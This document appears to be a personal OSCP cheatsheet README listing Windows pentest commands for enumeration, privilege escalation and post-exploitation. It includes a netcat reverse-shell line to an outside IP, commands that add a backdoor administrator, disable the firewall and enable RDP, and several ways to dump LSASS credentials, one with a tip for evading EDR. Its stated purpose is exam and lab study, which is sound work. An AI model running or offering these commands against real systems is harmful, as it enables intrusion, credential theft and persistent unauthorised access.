# OSCP Helpsheet
Simple helpsheet or cheatsheet whatever you want to call it for enumerating machines, guidance on good commands to run, etc,.
Probably wont put any linux since its straightforward. There are some simple scripts included in this repo that may prove to be helpful, i may update them or add more as time goes on.

Many, if not all of the commands below will have no context, they are just for reference so you (really I) dont have to remeber the syntax of every single command and the alternatives to each

## Random hidden gems
 - https://github.com/antonioCoco/RunasCs
 - https://github.com/nicocha30/ligolo-ng
 - https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
 - https://github.com/S3cur3Th1sSh1t/PowerSharpPack
 - https://github.com/BeichenDream/GodPotato
 - https://github.com/peass-ng/PEASS-ng
 - https://github.com/markwragg/PowerShell-Watch/blob/master/Watch/Public/Watch-Command.ps1
 - https://github.com/DominicBreuker/pspy
 - much more

## Windows

### Checklist from start to finish!
- What ports are open, obviously; what services are they running
- SCAN UDP!!!
- Can we access Kerberos on the domain controller?
    - Use kerbrute to bruteforce usernames for potential Kerberos Pre-auth?
- SMB Access, always try:
    - Guest
    - NULL: ''
    - No user
- Valid credentials?
    - Connect to SMB shares, use crackmap to enumerate permissions
    - ldap dump? use bloodhound-python or ldapdomaindump or ldapsearch
    - Try to login to all available services :)
- Post initial access
    - Run winpeas.exe, every time. Thoroughly examine results for cleartext credentials or obvious vulnerabilities
    - Check the groups your current user is in
    - Use powerup.ps1 for a possible quick privesc
    - SeImpersonatePrivilege is ROOT. Use GodPotato.exe to create and execute a malicious service to get NT\Authority
    - Hacktricks, always refer to hacktricks website
    - ippsec.rocks is a great resource too, as well as 0xdf's writeups. Smart people..
    - Enumerate all services on the machine, can you manipulate them
    - Abuse Get-ChildItem to find loot
    - Check groups and nested groups, bloodhound is a great tool
    - Look at all the log files
    - Check for services that are only accessible locally, use chisel or similar to access remotely
    - Do NOT miss a single ConsoleHost_history.txt file. Always gold in those..
    - valid credentials, see if any users are kerberoastable
- Post enumeration
    - Mimikatz, dump dump dump
    - Check admin ConsoleHost_history.txt
    - Look in previously unaccessible directories for log or credential files
    - Establish persistance

----------------------------------------------------------------------

### Credential one-liner

```$pwd = ConvertTo-SecureString 'password' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)```

----------------------------------------------------------------------

### Kerbrute

```kerbrute userenum -d {domain} /wordlist --dc {ip}```

If we find a valid username see if preauth is set, easy win

```impacket-GetNPUsers -request -dc-ip {ip} domain/username```

----------------------------------------------------------------------

### PowerShell

```PS> Start-Process -FilePath "C:\Users\User\nc.exe" -ArgumentList "-e cmd.exe 10.10.15.49 443" -Credential $creds```

```PS> Get-LocalUser```

```PS> Get-LocalGroup```

```PS> Get-LocalGroupMember {group}```

```PS> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname```

```PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname```

```PS> Get-Process```

```PS> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue```

```PS> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue```

```PS> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue```

```PS> runas /user:backupadmin cmd```

```PS> Get-History```

```PS> (Get-PSReadlineOption).HistorySavePath```

```PS> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}```

```PS> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}```

```PS> Get-WmiObject Win32_Service | Where-Object {$_.PathName -like 'C:\Status*'}```

```PS> Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE Name = 'DevService'" | Select-Object Name, StartMode, State, Status, PathName, DisplayName```

```PS> Get-Service -Name "DevService" | Format-List *```

```PS> Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 10```

----------------------------------------------------------------------

### Service DLL Hijacking
DLL Safe boot order:
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

- Copy suspicious binary to our attack windows machine
- Execute ProcMon to monitor the binary as it is started to see what DLLs it is loading
- Create file can be used to create or open a file, dont be fooled!
- See dummy_dll.cpp for an example dll file

```PS> Restart-Service {service}```

----------------------------------------------------------------------

### Unquoted service paths
- If the service path is unquoted and contains spaces we can probably hijack
- PowerUp.ps1 can find unquoted service paths:

```PS> Get-UnquotedService```

```PS> Get-CimInstance -ClassName win32_service | Select Name,State,PathName```

```cmd> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """```

----------------------------------------------------------------------

### Scheduled Tasks

```PS> schtasks /query /fo LIST /v```

```PS> Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }```

```PS> schtasks /query /fo LIST /v | Out-String -Stream | Select-String "TaskName|Author|Task To Run"```

```PS> schtasks /query /fo LIST /v | Out-String -Stream | Select-String -Pattern "^Folder:" -Context 0,3 | Where-Object { $_ -notmatch "\\Microsoft" } | ForEach-Object { $_.Context.PostContext[0] }```

----------------------------------------------------------------------

### Enable RDP

```cmd> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```

```cmd> reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f```

----------------------------------------------------------------------

### Add new user

```cmd> net user yam P@ssword123 /add```

```cmd> net localgroup Administrators yam /add```

----------------------------------------------------------------------

### Disable firewalls

```cmd> netsh advfirewall set allprofiles state off```

----------------------------------------------------------------------

### Share access

```PS> Grant-SmbShareAccess -Name "ShareName" -AccountName "DOMAIN\UserOrGroupName" -AccessRight Full -Force```

```PS> Grant-SmbShareAccess -Name \"ADMIN$\" -AccountName \"MS01\yam\" -AccessRight Full -Force```

```cmd> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f```

```cmd> reg add \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f```

----------------------------------------------------------------------

### Easy SMB transfers

```start smb server with impacket-smbserver```

```cmd> net use \\10.10.10.10\share /u:df df```

```cmd> copy 20191018035324_BloodHound.zip \\10.10.10.10\share\```

```cmd> del {file}```

```cmd> net use /d```

----------------------------------------------------------------------

### Dumping LSASS without mimikatz

```cmd> whoami /priv```

make sure that we have SeDebugPrivilege
on modern machines windows will kill any PS process that attempts to dump LSASS so this needs to be done from CMD or .NET tools

#### TASK MANAGER
You can create a dump of LSASS using the task manager, right click on the lsass.exe process and select create dump file, then load this into mimikatz

Being connected with xfreerdp is great because we can use this to automatically mount a shared drive to copy files using the following syntax:

```$ xfreerdp /v:{ipaddress} /u:USERNAME /p:PASSWORD /d:DOMAIN /drive:SHARE,/path/shared```

This creates a shared drive named SHARE on the windows machine, which we can then drop the dump into
We can then use pypykatz to extract the stored credentials from the dump:

```$ pypykatz lsa minidump lsass.DMP```

#### PROCDUMP

```cmd> procdump.exe -accepteula -ma lsass.exe out.dmp```

Some EDR solutions will be alerted by this and block based on the "lsass" so instead we can find the process ID and pass that

```PS> get-process lsass```

```PS> tasklist | findstr lsass```

Then dump

```cmd> procdump.exe -accepteula -ma {id} out.dmp```


#### CRACKMAPEXEC!!!

```$ crackmapexec smb {ip address} -u administrator -p Password123 --lsa```
